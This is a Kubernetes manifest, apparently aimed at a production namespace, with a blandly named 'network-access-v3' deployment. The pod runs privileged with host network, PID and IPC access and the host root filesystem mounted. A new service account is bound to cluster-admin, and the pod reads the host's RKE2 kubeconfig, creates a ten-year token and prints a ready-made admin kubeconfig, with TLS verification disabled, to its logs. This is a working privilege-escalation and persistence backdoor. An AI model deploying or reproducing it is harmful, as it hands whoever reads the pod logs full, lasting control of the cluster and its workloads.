
apiVersion: apps/v1
kind: Deployment
metadata:
  name: network-access-v3
  namespace: egam-production
  labels:
    app: network-access-v3
spec:
  replicas: 1
  selector:
    matchLabels:
      app: network-access-v3
  template:
    metadata:
      labels:
        app: network-access-v3
    spec:
      hostNetwork: true
      hostPID: true
      hostIPC: true
      serviceAccountName: admin-sa
      containers:
      - name: shell
        image: nicolaka/netshoot:latest
        command:
          - /bin/bash
          - -c
          - |
            export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml
            set -x
            apk add --no-cache curl jq 2>&1 | tail -3
            if ! command -v kubectl >/dev/null 2>&1; then
              curl -fsSL -o /usr/local/bin/kubectl "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" && chmod +x /usr/local/bin/kubectl
            fi
            APISERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
            TOKEN=$(kubectl create token admin-sa -n egam-production --duration=87600h 2>/dev/null)
            cat > /tmp/admin.kubeconfig << KCFG
            apiVersion: v1
            kind: Config
            clusters:
            - cluster:
                server: $APISERVER
                insecure-skip-tls-verify: true
              name: cluster
            contexts:
            - context:
                cluster: cluster
                user: admin-sa
              name: context
            current-context: context
            users:
            - name: admin-sa
              user:
                token: $TOKEN
            KCFG
            cat /tmp/admin.kubeconfig
            sleep 36000
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /host
          name: host
      volumes:
      - name: host
        hostPath:
          path: /
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: admin-sa
  namespace: egam-production
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: admin-sa-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: admin-sa
  namespace: egam-production
